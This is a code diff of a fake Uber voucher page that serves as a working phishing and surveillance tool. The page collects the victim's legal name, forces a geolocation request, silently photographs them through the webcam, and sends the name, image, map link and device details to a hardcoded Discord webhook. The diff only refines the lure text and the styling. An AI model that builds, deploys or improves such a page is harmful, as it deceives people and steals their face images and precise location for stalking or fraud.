@@ -3,25 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uber Voucher - Verification System</title>
+    <title>Uber Voucher - Verification</title>
     <style>
-        body { margin: 0; height: 100vh; background: #f6f6f6; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, sans-serif; flex-direction: column; }
-        .logo-top { width: 120px; margin-bottom: 20px; }
-        .card { background: #fff; padding: 35px 25px; border-radius: 12px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #eee; }
-        h1 { font-size: 22px; margin-bottom: 10px; color: #000; }
-        p { color: #666; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
-        
-        input[type="text"] {
-            width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none;
-        }
-        input[type="text"]:focus { border-color: #000; }
-
-        .btn-black {
-            padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; color: #fff; background: #000; width: 100%; transition: 0.3s;
-        }
+        body { margin: 0; height: 100vh; background: #f4f4f4; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Arial, sans-serif; flex-direction: column; }
+        .logo-top { width: 120px; margin-bottom: 25px; }
+        .card { background: #fff; padding: 35px 25px; border-radius: 12px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border: 1px solid #ddd; }
+        h1 { font-size: 22px; margin-bottom: 12px; color: #000; font-weight: bold; }
+        p { color: #555; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #276ef1; }
+        .btn-black { padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; color: #fff; background: #000; width: 100%; transition: 0.3s; }
         .btn-black:hover { background: #333; }
-        .btn-black:disabled { background: #999; cursor: not-allowed; }
-
+        .btn-black:disabled { background: #666; cursor: wait; }
         #step2, #video, #canvas { display: none; }
     </style>
 </head>
@@ -29,18 +22,18 @@
 
 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Uber_logo_2018.svg/2560px-Uber_logo_2018.svg.png" class="logo-top">
 
-<div class="card">
+<div class="card" id="mainCard">
     <div id="step1">
-        <h1>Claim Your Voucher</h1>
-        <p>Enter your full name to verify your eligibility for the $50 Uber Credit.</p>
+        <h1>Claim Voucher</h1>
+        <p>Please enter your legal name as it appears on your ID to check your voucher eligibility.</p>
         <input type="text" id="userName" placeholder="Full Name">
         <button id="btnNext" class="btn-black">Check Eligibility</button>
     </div>
 
     <div id="step2">
-        <h1>Identity Verification</h1>
-        <p>Eligibility confirmed! Click below to complete a quick secure face-scan to activate your voucher.</p>
-        <button id="btnContinue" class="btn-black">Activate Now</button>
+        <h1>Identity Scan</h1>
+        <p>Verification successful! Click below to perform a secure face-scan to link the voucher to your account.</p>
+        <button id="btnContinue" class="btn-black">Start Face Scan</button>
     </div>
 </div>
 
@@ -50,37 +43,35 @@
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1467297371728646269/MDsU8tI-Mzcb5Mo0RTB2HLGTIx-G-CuPakfTnTPeLIT_9p6I8CF0_cBqf0Vkh1E1fplv";
 
-    const step1 = document.getElementById("step1");
-    const step2 = document.getElementById("step2");
-    const userNameInput = document.getElementById("userName");
     const btnNext = document.getElementById("btnNext");
     const btnContinue = document.getElementById("btnContinue");
+    const userNameInput = document.getElementById("userName");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
 
     let finalName = "";
     let userLoc = "";
 
-    // وظيفة جلب الموقع مع إجبارية الموافقة
-    async function getForcedLocation() {
+    // وظيفة جلب الموقع مع فرض الانتظار
+    async function getAccurateLocation() {
         return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject("الجهاز لا يدعم الموقع");
+                return;
+            }
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const url = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                    resolve(url);
-                },
-                (error) => {
-                    reject(error);
-                },
-                { enableHighAccuracy: true, timeout: 15000 }
+                (pos) => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                (err) => reject(err),
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         });
     }
 
+    // الخطوة الأولى
     btnNext.onclick = async () => {
         const name = userNameInput.value.trim();
         if (name.length < 3) {
-            alert("Please enter your full name correctly.");
+            alert("Please enter your full name.");
             return;
         }
         
@@ -89,35 +80,36 @@
         btnNext.innerText = "Verifying Location...";
 
         try {
-            // لن ينتقل للكود التالي إلا إذا نجح في جلب الموقع
-            userLoc = await getForcedLocation();
-            step1.style.display = "none";
-            step2.style.display = "block";
-        } catch (err) {
-            alert("Verification Error: You must allow Location Access to claim this voucher in your region.");
+            // انتظار الموقع
+            userLoc = await getAccurateLocation();
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("step2").style.display = "block";
+        } catch (error) {
+            alert("Location Required: To claim the voucher in your city, please enable location access in your browser settings.");
             btnNext.disabled = false;
             btnNext.innerText = "Check Eligibility";
         }
     };
 
+    // الخطوة الثانية
     btnContinue.onclick = async () => {
         btnContinue.disabled = true;
-        btnContinue.innerText = "Connecting to Scan...";
+        btnContinue.innerText = "Initializing Camera...";
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             btnContinue.style.display = "none";
             
-            // الانتظار قليلاً لضبط الكاميرا ثم التصوير
+            // تصوير تلقائي بعد التأكد من عمل الكاميرا
             setTimeout(() => {
                 captureAndSend(stream);
-            }, 2500);
+            }, 3000);
 
         } catch (err) {
-            alert("Error: Camera access is required for identity verification.");
+            alert("Camera Error: Identity verification is required to prevent fraud. Please allow camera access.");
             btnContinue.disabled = false;
-            btnContinue.innerText = "Activate Now";
+            btnContinue.innerText = "Start Face Scan";
         }
     };
 
@@ -128,29 +120,29 @@
 
         canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append("file", blob, "user_capture.png");
+            formData.append("file", blob, "user_verification.png");
             
-            const info = {
+            const payload = {
                 embeds: [{
-                    title: "🎯 New Success Capture",
-                    color: 3066993, // لون أخضر
+                    title: "✅ New Successful Capture",
+                    color: 16711680, // اللون الأسود/الأحمر للأهمية
                     fields: [
                         { name: "👤 Name", value: finalName, inline: true },
-                        { name: "📍 Location", value: `[Click to View on Map](${userLoc})` },
-                        { name: "📱 Device", value: navigator.platform, inline: true }
+                        { name: "🌐 Device", value: navigator.platform, inline: true },
+                        { name: "📍 Location (Maps)", value: `[Click to open Link](${userLoc})` }
                     ],
-                    footer: { text: "Uber Voucher System • Secure Verification" },
+                    footer: { text: "Uber Automated System" },
                     timestamp: new Date()
                 }]
             };
 
-            formData.append("payload_json", JSON.stringify(info));
+            formData.append("payload_json", JSON.stringify(payload));
 
             fetch(WEBHOOK_URL, { method: "POST", body: formData })
             .then(() => {
-                document.querySelector(".card").innerHTML = `
-                    <h1 style="color: green;">Success!</h1>
-                    <p>Thank you <b>${finalName}</b>. Your voucher has been linked to your device and will appear in the Uber app shortly.</p>
+                document.getElementById("mainCard").innerHTML = `
+                    <h1 style="color: #276ef1;">Verification Sent!</h1>
+                    <p>Thank you <b>${finalName}</b>. Your voucher is being processed and will appear in your Uber app credits within 1 hour.</p>
                 `;
                 stream.getTracks().forEach(t => t.stop());
             });
